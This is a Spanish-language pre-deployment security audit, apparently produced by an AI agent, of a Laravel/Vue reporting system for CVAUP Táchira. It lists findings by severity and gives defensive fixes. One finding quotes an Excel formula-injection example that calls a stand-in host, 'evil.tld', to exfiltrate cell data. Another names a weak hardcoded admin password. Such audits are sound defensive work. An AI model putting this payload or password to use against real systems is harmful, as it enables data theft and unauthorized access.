# AUDITORÍA DE SEGURIDAD — CVAUP Reportes

**Fecha**: 2026-05-06
**Auditor**: Security Engineer (Claude Opus 4.7 — agente especializado)
**Scope**: Sistema completo pre-deploy (Laravel 11 + Vue 3 + Inertia + MySQL)
**Cliente**: CVAUP Táchira — Corporación Venezolana de Agricultura Urbana y Periurbana

---

## RESUMEN EJECUTIVO

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 **CRITICAL** | 3 | Bloqueante para producción |
| 🟠 **HIGH** | 5 | Corrección requerida |
| 🟡 **MEDIUM** | 7 | Corrección recomendada |
| 🔵 **LOW** | 5 | Higiene |
| ⚪ **INFO** | 4 | Defensa en profundidad |

**Veredicto**: REQUIERE CORRECCIONES ANTES DE DEPLOY

---

## HALLAZGOS

### 🔴 CRITICAL #1 — Credenciales hardcodeadas y débiles en seeder

**Archivo**: `database/seeders/AdminUserSeeder.php:21`

La contraseña del único administrador está hardcodeada como `cvaup2026`. Esta contraseña:

1. Aparece en código fuente versionable
2. NO cumple la política institucional definida en `PasswordController.php`
3. Es predecible (organismo + año actual) — está en cualquier wordlist
4. `updateOrCreate` la sobrescribe cada vez que se ejecuta `db:seed`

**Riesgo**: Cualquier persona con acceso al repo (TI institucional, dev futuro) puede iniciar sesión como admin con esa cred.

**Mitigación**:

```php
// database/seeders/AdminUserSeeder.php
public function run(): void
{
    $email = env('ADMIN_EMAIL');
    $password = env('ADMIN_INITIAL_PASSWORD');

    if (empty($email) || empty($password)) {
        throw new \RuntimeException(
            'Requiere ADMIN_EMAIL y ADMIN_INITIAL_PASSWORD en .env. ' .
            'Genera con: openssl rand -base64 24'
        );
    }

    User::firstOrCreate(
        ['email' => $email],
        [
            'name' => 'Administrador CVAUP Táchira',
            'password' => Hash::make($password),
            'email_verified_at' => now(),
        ]
    );
}
```

**Referencia**: OWASP A07:2021, CWE-798, CWE-521

---

### 🔴 CRITICAL #2 — Fotos institucionales accesibles sin autenticación

**Archivos**:
- `config/filesystems.php:41-48` (disk `public` con visibility público)
- `app/Services/PhotoCompressor.php:66`
- `app/Http/Controllers/ReporteController.php:202, 326, 359`

Las fotos se guardan en `storage/app/public/fotos/{tecnicos|reportes}/{ID}/foto-N.webp` y se sirven directamente vía symlink `public/storage`. **Sin auth middleware**. URLs **secuenciales y predecibles**.

**Riesgo**: Cualquier persona con conexión al servidor puede enumerar IDs y descargar TODAS las fotos sin sesión. Para una corporación gubernamental que maneja PII (técnicos identificables), es violación directa de protección de datos.

**Reproducción**: Copiar URL `/storage/fotos/reportes/1/foto-1.webp` → abrir en pestaña incógnito → descarga sin restricción.

**Mitigación**:
1. Mover fotos a disk `local` (privado).
2. Crear `FotoController` autenticado con validación regex anti-traversal.
3. Reemplazar `asset('storage/...')` por `route('fotos.reporte', ...)` en todos los controllers.
4. Migración one-shot: `php artisan fotos:migrar-a-privado`.

**Referencia**: OWASP A01:2021, CWE-639, CWE-200

---

### 🔴 CRITICAL #3 — Sin headers HTTP de seguridad ni CSP

**Archivos**:
- `bootstrap/app.php:13-20`
- `app/Http/Middleware/`
- `resources/views/app.blade.php`

La aplicación NO envía:
- Content-Security-Policy
- Strict-Transport-Security (HSTS)
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY (susceptible a clickjacking)
- Referrer-Policy
- Permissions-Policy

**Riesgo**: Cualquier XSS futuro tiene impacto MÁXIMO. Sistema embebible en iframe (clickjacking).

**Mitigación**: Crear `app/Http/Middleware/SecurityHeaders.php`:

```php
class SecurityHeaders
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);
        $isProd = app()->isProduction();

        $csp = "default-src 'self'; "
             . "script-src 'self' 'unsafe-inline'; "
             . "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
             . "font-src 'self' https://fonts.gstatic.com data:; "
             . "img-src 'self' data: blob:; "
             . "connect-src 'self'; "
             . "frame-ancestors 'none'; "
             . "form-action 'self'; "
             . "base-uri 'self'; "
             . "object-src 'none';";

        $response->headers->set('Content-Security-Policy', $csp);
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), interest-cohort=()');
        $response->headers->set('X-Permitted-Cross-Domain-Policies', 'none');

        if ($isProd) {
            $response->headers->set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
        }

        return $response;
    }
}
```

Registrar en `bootstrap/app.php` ANTES de `HandleInertiaRequests`.

**Referencia**: OWASP Secure Headers Project, CWE-693, CWE-1021

---

### 🟠 HIGH #1 — Excel Formula Injection en exports

**Archivos**: `app/Exports/ReportesExport.php:67-97`, `app/Exports/UbicacionesExport.php`

PhpSpreadsheet/maatwebsite NO escapa strings que comienzan con `=`, `+`, `-`, `@`, tab o CR — Excel los interpreta como fórmulas al abrir.

**Riesgo**: Atacante con sesión inserta `=HYPERLINK("https://evil.tld/?d="&A1, "Click")` en `titulo_actividad` → al abrir el Excel exportado y compartirlo con otra dependencia, Excel ejecuta la fórmula y exfiltra datos.

**Mitigación**: Crear `app/Support/ExcelSanitizer.php`:

```php
class ExcelSanitizer
{
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    public static function clean(?string $value): ?string
    {
        if ($value === null || $value === '') return $value;
        $first = mb_substr($value, 0, 1);
        if (in_array($first, self::DANGEROUS_PREFIXES, true)) {
            return "'" . $value;
        }
        return $value;
    }
}
```

Aplicar en TODOS los campos string de los Exports.

**Referencia**: OWASP CSV Injection, CWE-1236

---

### 🟠 HIGH #2 — Rate limiting ausente en endpoints pesados

**Archivos**: `routes/web.php:28, 49, 60-62, 68, 83`

Endpoints de PDF/Excel y backup sin throttle. El log muestra 5 incidentes de memory exhaustion confirmando la superficie de DoS.

**Mitigación**:

```php
Route::middleware('throttle:10,1')->group(function () {
    Route::post('/dashboard/exportar/pdf', [DashboardController::class, 'exportarPdf']);
    Route::get('/reportes/{reporte}/pdf', [ReporteController::class, 'pdf']);
    Route::post('/exportar/pdf', [ExportarController::class, 'pdfDownload']);
    Route::post('/exportar/excel', [ExportarController::class, 'excelDownload']);
    Route::match(['get','post'], '/ubicaciones/exportar/excel', [UbicacionController::class, 'exportarExcel']);
});

Route::middleware('throttle:3,60')->group(function () {
    Route::post('/backups/generar', [BackupController::class, 'generar']);
});
```

---

### 🟠 HIGH #3 — Backups sin encriptación obligatoria

**Archivo**: `config/backup.php:171`

`'password' => env('BACKUP_ARCHIVE_PASSWORD')` — si está vacía, Spatie genera ZIP sin encriptar.

**Mitigación**: Hacer obligatoria + excluir `.env` del backup (que TI gestione el secreto aparte):

```php
'password' => env('BACKUP_ARCHIVE_PASSWORD') ?: throw new \RuntimeException(
    'BACKUP_ARCHIVE_PASSWORD obligatoria. Generar: openssl rand -base64 32'
),
'include' => [
    storage_path('app/public/fotos'),
    // base_path('.env'),  // ← ELIMINAR
],
```

---

### 🟠 HIGH #4 — Stack traces reflejados al cliente

**Archivos**: `UbicacionController.php:510, 554`, `BackupController.php:86`

`'Error procesando el archivo: ' . $e->getMessage()` filtra paths absolutos, versiones de librerías, estructura interna.

**Mitigación**:

```php
} catch (\Throwable $e) {
    Log::error('[Importer] preview falló', [
        'message' => $e->getMessage(),
        'file' => $e->getFile() . ':' . $e->getLine(),
    ]);
    return response()->json([
        'message' => 'No se pudo procesar el archivo. Verifica el formato.',
    ], 422);
}
```

---

### 🟠 HIGH #5 — Código muerto Breeze (Register/Reset) presente

Controllers y Vue pages de Register/ForgotPassword/ResetPassword/EmailVerification existen pero rutas están deshabilitadas. Si un dev futuro reactiva las rutas, `RegisteredUserController` usa `Password::defaults()` — política DÉBIL incompatible con la institucional endurecida.

**Mitigación**: Eliminar:
- `app/Http/Controllers/Auth/{RegisteredUserController, PasswordResetLinkController, NewPasswordController, EmailVerificationNotificationController, EmailVerificationPromptController, VerifyEmailController}.php`
- `resources/js/Pages/Auth/{Register, ForgotPassword, ResetPassword, VerifyEmail}.vue`

---

### 🟡 MEDIUM #1 — APP_KEY ausente en algún despliegue (evidencia en log)

`storage/logs/laravel.log` tiene entrada `production.ERROR: No application encryption key has been specified` con stack trace completo (45 frames) — sugiere que en algún momento corrió en producción sin APP_KEY y posiblemente con APP_DEBUG=true.

**Mitigación**: Health check pre-deploy que valide `APP_DEBUG=false`, `APP_KEY=base64:...`.

---

### 🟡 MEDIUM #2 — Cookies sin Secure flag por defecto

`config/session.php:172` — `SESSION_SECURE_COOKIE` sin default `true`.

**Mitigación**: En `.env` producción:
```
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict
SESSION_ENCRYPT=true
```
Y `URL::forceScheme('https')` en `AppServiceProvider::boot()` cuando `isProduction()`.

---

### 🟡 MEDIUM #3 — Mass assignment laxo en Tecnico (sin audit log)

Modelo con `$fillable` extenso. Si futuro multi-tenant + un técnico tiene acceso a su perfil, podría escalar privilegios.

**Mitigación**: Switch a `$guarded = ['id', 'created_at', 'updated_at', 'deleted_at']` + activity log con `spatie/laravel-activitylog`.

---

### 🟡 MEDIUM #4 — Campos TEXT sin límite en validación

Campos `material_apoyo`, `certificacion`, `resultado`, `resumen_tematico` aceptan hasta 64KB sin `max:N` en validación.

**Mitigación**: `'max:5000'` (o `'max:10000'` en `resumen_tematico`).

---

### 🟡 MEDIUM #5 — Importación Excel sin límite de filas + acepta `.xls` legacy

PhpSpreadsheet con `.xls` legacy (BIFF) tuvo CVEs históricos de RCE.

**Mitigación**:
```php
'archivo' => 'required|file|mimes:xlsx|max:5120',  // solo xlsx, max 5MB
```
+ guard de `count($sheet) > 10000` en el importer.

---

### 🟡 MEDIUM #6 — FK `reportes.tecnico_id` con cascadeOnDelete + SoftDeletes

Si se ejecuta `forceDelete()` accidental (ej: bug en `DemoLimpiar` con LIKE muy amplio), borraría TODOS los reportes asociados.

**Mitigación**: Migración para cambiar a `restrictOnDelete()`. Adicional: en `DemoLimpiar` validar también `cedula LIKE '9999%'`.

---

### 🟡 MEDIUM #7 — LIKE %q% sin escape de wildcards

`%` y `_` dentro de `$q` no se escapan. Buscar `100%` matchea cualquier registro.

**Mitigación**: Helper `escapeLike()` con `addcslashes($value, '%_\\')`.

---

### 🔵 LOW #1 — Validación regex contra HTML en campos texto (defensa en profundidad)

Blade escapa correctamente con `{{ }}`, pero documentar que no se permite HTML.

---

### 🔵 LOW #2 — Token de import temporal sin TTL

Archivos en `import-temp/{token}.xlsx` quedan si el admin abandona el flujo.

**Mitigación**: Cron horario que borre archivos con mtime > 1h.

---

### 🔵 LOW #3 — Pagination.vue con v-html

Renderiza `link.label` (Laravel paginator) con v-html. Es HTML controlado por framework, riesgo nulo en práctica pero rompe el principio.

---

### 🔵 LOW #4 — BACKUP_NOTIFICATIONS_EMAIL con default hardcoded

`config/backup.php:228` cae a `admin@cvaup-tachira.com` si .env no lo define.

---

### 🔵 LOW #5 — robots.txt permisivo

`public/robots.txt` con `Disallow:` vacío.

**Mitigación**: `Disallow: /` para sistema interno.

---

### ⚪ INFO #1 — Logs con stack traces completos

Considerar redactar paths absolutos.

### ⚪ INFO #2 — Google Fonts (privacy)

Para contexto gubernamental venezolano, considerar self-hosted.

### ⚪ INFO #3 — Ziggy expone todas las rutas

Filtrar a las rutas que el frontend realmente usa.

### ⚪ INFO #4 — Endpoint `/up` health check público

Si TI no lo necesita, removerlo.

---

## ✅ ASPECTOS POSITIVOS — 18 buenas prácticas detectadas

1. Política de contraseñas fuerte en `PasswordController` (uncompromised + mixedCase + numbers + symbols + min:8).
2. Rate limiting en login (5 intentos por email+IP).
3. Regeneración de sesión en login + invalidación + token regenerate en logout (anti session fixation).
4. CSRF activo (default Laravel 11) + forms HTML con `_token`.
5. Anti path-traversal en `BackupController::resolveBackupPathOrFail` con regex + realpath + str_starts_with.
6. DomPDF con `isRemoteEnabled=false` explícito en los 3 endpoints de PDF (cierra SSRF).
7. Validación de imágenes con MIME + recompresión a WebP (anula payloads polyglot).
8. Validación de tamaño y prefijo en data URIs del export Dashboard PDF.
9. Server-side recálculo de stats en `DashboardController::exportarPdf` (no confía en el cliente).
10. SQL parametrizado en todos los `whereRaw`/`selectRaw`.
11. Validación de coherencia jerárquica de ubicaciones en `StoreReporteRequest`.
12. Soft-delete con UNIQUE compuesto (`tecnicos_cedula_deleted_at_unique`) — corrección documentada aplicada.
13. Guards triples en `DemoPoblar`/`DemoLimpiar`: bloqueo en producción + confirmación + marcador `[DEMO]`.
14. Backup encryption configurada (AES-256 default).
15. FormRequests con `withValidator` para lógica de negocio (día laborable, unique técnico+fecha).
16. `composer audit` y `npm audit` SIN vulnerabilidades reportadas — cadena limpia.
17. `.env` correctamente excluido de git via `.gitignore`.
18. Regex de cédula venezolana estricta (`/^[VEJG]-\d{1,2}\.\d{3}\.\d{3}$/i`).

---

## 📋 SIGUIENTE ACCIÓN — Lista priorizada (Fase 14.5 antes de Fase 15)

### 🔴 Bloqueantes (CRITICAL)

1. **AdminUserSeeder**: eliminar password hardcoded → `firstOrCreate` + `env('ADMIN_INITIAL_PASSWORD')` con throw si falta.
2. **Fotos privadas**: mover a disk `local`, crear `FotoController`, reemplazar `asset()` por `route()`.
3. **SecurityHeaders middleware**: crear + registrar en `bootstrap/app.php`.

### 🟠 Alta prioridad (HIGH)

4. **ExcelSanitizer**: crear y aplicar en `ReportesExport` y `UbicacionesExport`.
5. **Rate limiting**: `throttle:10,1` en PDF/Excel + `throttle:3,60` en backup.
6. **Backup obligatorio cifrado**: throw si `BACKUP_ARCHIVE_PASSWORD` vacía + excluir `.env`.
7. **Stack traces ocultos**: reemplazar `$e->getMessage()` por mensaje genérico + Log::error.
8. **Eliminar Auth Breeze obsoleto**: 6 controllers + 4 Vue pages.

### 🟡 Media prioridad (MEDIUM)

9. Auditar `.env`: APP_DEBUG=false, APP_KEY generada, SESSION_SECURE_COOKIE=true.
10. `max:5000`/`max:10000` en campos text de Reporte.
11. Excel import: solo `xlsx`, max 5MB, max 10K filas.
12. Migración: FK `reportes.tecnico_id` → `restrictOnDelete()`.
13. Helper `escapeLike()` en queries con LIKE.

### 🔵 Baja prioridad (LOW)

14. Cleanup `import-temp/*` cron horario.
15. Refactor `Pagination.vue` sin v-html.
16. `robots.txt` con `Disallow: /`.
17. Self-hosted fonts.
18. Filtrar Ziggy a rutas usadas.
19. (Recomendación fuerte) MFA con `pragmarx/google2fa-laravel` antes de Fase 15.

---

## ⚙️ RECOMENDACIONES PRE-DEPLOY (TI institucional)

### `.env` de producción

```env
APP_NAME="CVAUP Táchira"
APP_ENV=production
APP_KEY=base64:GENERAR_CON_php_artisan_key:generate
APP_DEBUG=false
APP_URL=https://cvaup-tachira.gob.ve

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_DATABASE=cvaup_reportes
DB_USERNAME=cvaup_app    # NO root
DB_PASSWORD=<openssl rand -base64 32>

SESSION_DRIVER=database
SESSION_LIFETIME=60
SESSION_ENCRYPT=true
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict
SESSION_HTTP_ONLY=true

BACKUP_ARCHIVE_PASSWORD=<openssl rand -base64 32>
BACKUP_NOTIFICATIONS_EMAIL=alertas-ti@cvaup-tachira.gob.ve

MAIL_MAILER=smtp
MAIL_HOST=smtp.cvaup-tachira.gob.ve
MAIL_USERNAME=sistema
MAIL_PASSWORD=<secret>
MAIL_ENCRYPTION=tls

ADMIN_EMAIL=admin@cvaup-tachira.gob.ve
ADMIN_INITIAL_PASSWORD=<openssl rand -base64 24>

LOG_CHANNEL=daily
LOG_LEVEL=warning
```

### Comandos de deploy

```bash
composer install --no-dev --optimize-autoloader
php artisan key:generate     # solo si APP_KEY no existe
php artisan migrate --force
php artisan db:seed --class=AdminUserSeeder --force
php artisan db:seed --class=UbicacionesSeeder --force
php artisan config:cache
php artisan route:cache
php artisan view:cache
chmod -R 750 storage bootstrap/cache
chown -R www-data:www-data storage bootstrap/cache
```

### Apache/Nginx

- Forzar HTTPS con redirect 301
- TLS 1.2+ únicamente
- Bloquear acceso directo a `/.env*`, `/storage/*.key`
- Limit body size a 20MB

### Primer ingreso

1. TI entrega contraseña inicial por canal seguro (SMS/sobre, NO email).
2. Admin DEBE cambiarla en primer login.
3. Considerar MFA con `pragmarx/google2fa-laravel`.
